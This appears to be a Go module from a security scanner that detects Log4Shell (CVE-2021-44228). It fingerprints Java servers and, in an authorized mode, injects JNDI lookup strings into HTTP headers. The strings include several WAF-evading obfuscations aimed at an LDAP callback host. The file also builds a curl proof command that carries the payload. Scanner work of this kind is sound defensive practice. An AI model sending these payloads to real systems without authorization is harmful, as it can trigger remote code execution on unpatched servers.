// Package log4shell detects potential Log4j JNDI injection (CVE-2021-44228)
// in HTTP headers. It operates in two modes:
//
// Surface mode: passively checks response headers and cookies for Java/Log4j
// stack signals (Tomcat, JSESSIONID, X-Powered-By: Spring, etc.). Signals are
// recorded in finding Evidence but no finding is emitted — they inform whether
// a deep scan is worthwhile.
//
// ScanAuthorized mode: injects JNDI payloads into common HTTP headers and looks for
// reflection of the literal "${jndi:" string in the response body (some debug
// endpoints echo request headers). If the BEACON_OOB_DOMAIN environment
// variable is set, the payload uses that domain for out-of-band detection.
// Active exploitation probes require ScanAuthorized mode (--authorized flag).
package log4shell

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/stormbane/beacon/internal/finding"
	"github.com/stormbane/beacon/internal/module"
)

const (
	scannerName     = "log4shell"
	maxBodySize     = 32 * 1024 // 32 KB
	defaultOOBHost  = "beacon-log4shell-test.invalid"
	jndiPrefix      = "${jndi:"
	reflectionMarker = "${jndi:"
)

// javaServerTokens are substrings that indicate a Java application server.
var javaServerTokens = []string{
	"Tomcat", "Jetty", "WildFly", "JBoss", "WebLogic", "WebSphere",
}

// javaPoweredByTokens are substrings in X-Powered-By suggesting Java/Spring.
var javaPoweredByTokens = []string{"Java", "Spring", "Servlet"}

// injectHeaders are the header names that receive the JNDI payload in deep mode.
var injectHeaders = []string{
	"User-Agent",
	"X-Forwarded-For",
	"X-Api-Version",
	"Accept-Language",
	"Referer",
	"X-Forwarded-Host",
}

// Scanner detects Log4Shell (CVE-2021-44228) exposure.
type Scanner struct{}

// New returns a new Scanner.
func New() *Scanner { return &Scanner{} }

// Name returns the stable scanner identifier.
func (s *Scanner) Name() string { return scannerName }

// Run executes the Log4Shell scan.
func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	scheme := detectScheme(ctx, client, asset)
	targetURL := scheme + "://" + asset + "/"

	if scanType == module.ScanSurface {
		// Passive: fetch the root page and inspect headers/cookies only.
		detectJavaSignals(ctx, client, targetURL, asset)
		// Surface mode never emits a finding — signals are informational only.
		return nil, nil
	}

	// Exploitation probes require --authorized (beyond --deep).
	if scanType != module.ScanAuthorized {
		return nil, nil
	}
	// ScanAuthorized mode: send JNDI payloads and look for reflection.
	return s.deepScan(ctx, client, targetURL, asset)
}

// obfuscatedPayloads returns JNDI payloads with WAF-bypass obfuscation.
// Log4j's recursive lookup parser resolves nested ${...} expressions before
// evaluating the outer expression, enabling bypass of signature-based WAFs.
func obfuscatedPayloads(callbackHost string) []struct {
	payload string
	label   string
} {
	return []struct {
		payload string
		label   string
	}{
		{
			payload: fmt.Sprintf("${jndi:ldap://%s/${hostName}}", callbackHost),
			label:   "plain",
		},
		{
			payload: fmt.Sprintf("${${lower:j}ndi:ldap://%s/${hostName}}", callbackHost),
			label:   "lower-j",
		},
		{
			payload: fmt.Sprintf("${${::-j}${::-n}${::-d}${::-i}:ldap://%s/${hostName}}", callbackHost),
			label:   "char-split",
		},
		{
			payload: fmt.Sprintf("${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://%s/${hostName}}", callbackHost),
			label:   "full-lower",
		},
		{
			payload: fmt.Sprintf("${${upper:j}ndi:ldap://%s/${hostName}}", callbackHost),
			label:   "upper-j",
		},
		{
			payload: fmt.Sprintf("${j${::-n}di:ldap://%s/${hostName}}", callbackHost),
			label:   "partial-split",
		},
	}
}

// deepScan sends JNDI payloads in HTTP headers and checks for reflection.
func (s *Scanner) deepScan(ctx context.Context, client *http.Client, targetURL, asset string) ([]finding.Finding, error) {
	oobDomain := os.Getenv("BEACON_OOB_DOMAIN")
	useOOB := oobDomain != ""

	// Require Java signals before trusting header-reflection as evidence.
	// Many non-Java servers (nginx debug pages, Rack, etc.) echo arbitrary
	// headers back in the response body — that alone does not indicate Log4j.
	// If OOB detection is configured we have real DNS/LDAP callback evidence
	// and can skip this gate.
	javaEv := detectJavaSignals(ctx, client, targetURL, asset)
	hasJavaSignals := javaEv != nil && javaEv["java_detected"] == true

	var callbackHost string
	if useOOB {
		callbackHost = oobDomain
	} else {
		callbackHost = defaultOOBHost
	}

	allPayloads := obfuscatedPayloads(callbackHost)

	var findings []finding.Finding

	for _, header := range injectHeaders {
		for _, p := range allPayloads {
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set(header, p.payload)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
			resp.Body.Close()

			// Check whether the raw JNDI string is reflected in the response body.
			// Without OOB detection we also require Java server signals — otherwise
			// any debug endpoint that echoes headers would produce a false positive.
			if !strings.Contains(string(body), reflectionMarker) {
				continue
			}
			if !useOOB && !hasJavaSignals {
				continue
			}

			desc := fmt.Sprintf(
				"The application reflects the JNDI payload injected via the %q header back "+
					"in the response body. This indicates the server echoes request headers "+
					"(e.g. through a debug endpoint), and if Log4j processes those headers the "+
					"server is vulnerable to CVE-2021-44228 Remote Code Execution. An attacker "+
					"can exploit this to load and execute arbitrary Java classes from an "+
					"attacker-controlled LDAP server.",
				header)

			if p.label != "plain" {
				desc += fmt.Sprintf(" The %q obfuscation variant was used to bypass WAF signatures.", p.label)
			}

			ev := map[string]any{
				"url":             targetURL,
				"injected_header": header,
				"payload":         p.payload,
				"obfuscation":     p.label,
				"reflection":      "jndi_string_in_body",
			}

			if useOOB {
				ev["oob_domain"] = oobDomain
				ev["oob_detection"] = true
				desc += fmt.Sprintf(
					" Out-of-band detection was used: the payload requested %s.", oobDomain)
			}

			findings = append(findings, finding.Finding{
				CheckID:     finding.CheckCVELog4Shell,
				Module:      "deep",
				Scanner:     scannerName,
				Severity:    finding.SeverityCritical,
				Title:       fmt.Sprintf("Log4Shell (CVE-2021-44228): JNDI payload reflected via %s header (%s)", header, p.label),
				Description: desc,
				Asset:       asset,
				DeepOnly:    true,
				ProofCommand: fmt.Sprintf(
					`curl -s -H '%s: %s' https://%s/ | grep -i 'jndi\|log4j'`,
					header, p.payload, asset),
				Evidence:     ev,
				DiscoveredAt: time.Now(),
			})

			// One finding per asset is enough — stop all loops.
			return findings, nil
		}
	}

	return findings, nil
}

// detectJavaSignals performs a passive read of the root page and checks
// response headers for Java/application-server signals. It does not emit
// findings — callers can inspect the returned evidence map if needed.
// Currently used only for the surface-mode no-op path.
func detectJavaSignals(ctx context.Context, client *http.Client, targetURL, _ string) map[string]any {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	io.Copy(io.Discard, io.LimitReader(resp.Body, 4096)) //nolint:errcheck
	resp.Body.Close()

	ev := map[string]any{}

	server := resp.Header.Get("Server")
	for _, tok := range javaServerTokens {
		if strings.Contains(server, tok) {
			ev["java_detected"] = true
			ev["server_token"] = tok
			break
		}
	}

	poweredBy := resp.Header.Get("X-Powered-By")
	for _, tok := range javaPoweredByTokens {
		if strings.Contains(poweredBy, tok) {
			ev["java_detected"] = true
			ev["powered_by_token"] = tok
			break
		}
	}

	// JSESSIONID in Set-Cookie is a strong Java signal.
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "JSESSIONID" {
			ev["java_detected"] = true
			ev["jsessionid"] = true
			break
		}
	}

	return ev
}

// detectScheme tries HTTPS first, falling back to HTTP.
func detectScheme(ctx context.Context, client *http.Client, asset string) string {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, "https://"+asset, nil)
	if err != nil {
		return "http"
	}
	resp, err := client.Do(req)
	if err != nil {
		return "http"
	}
	resp.Body.Close()
	return "https"
}
